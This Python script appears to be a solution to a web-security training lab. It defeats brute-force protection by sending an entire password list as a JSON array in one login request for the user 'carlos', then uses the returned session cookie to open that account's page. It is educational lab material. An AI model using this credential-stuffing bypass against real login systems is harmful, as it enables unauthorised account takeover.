#########################################################################
#
# Lab: Broken brute-force protection, multiple credentials per request
#
# Hack Steps: 
#      1. Read password list
#      2. Send multiple passwords in the same request
#      3. Get the session cookie of carlos
#      4. Fetch carlos profile
#
#########################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a17006a03b477568395c73000a40095.web-security-academy.net"

def main():
    print("⦗1⦘ Reading password list.. ", end="", flush=True)

    password_list = read_password_list("../passwords.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Sending multiple passwords in the same request.. ", end="", flush=True)
    
    json = { "username": "carlos", "password": password_list }
    login_with_multiple_passwords = post_data("/login", json=json)

    print(Fore.GREEN + "OK")    
    if login_with_multiple_passwords.status_code == 302:  
        print(Fore.WHITE + "⦗3⦘ Getting the session cookie of carlos.. ", end="", flush=True)
        
        session = login_with_multiple_passwords.cookies.get("session")
        
        print(Fore.GREEN + "OK")    
        print(Fore.WHITE + "⦗4⦘ Fetching carlos profile.. ", end="", flush=True)
        
        cookies = { "session": session }
        fetch("/my-account?id=carlos", cookies)
    
        print(Fore.GREEN + "OK")    
        print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
    else:
        print(Fore.RED + "⦗!⦘ No valid passwords was found")


def read_password_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, json):
    try:    
        return requests.post(f"{LAB_URL}{path}", json=json, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()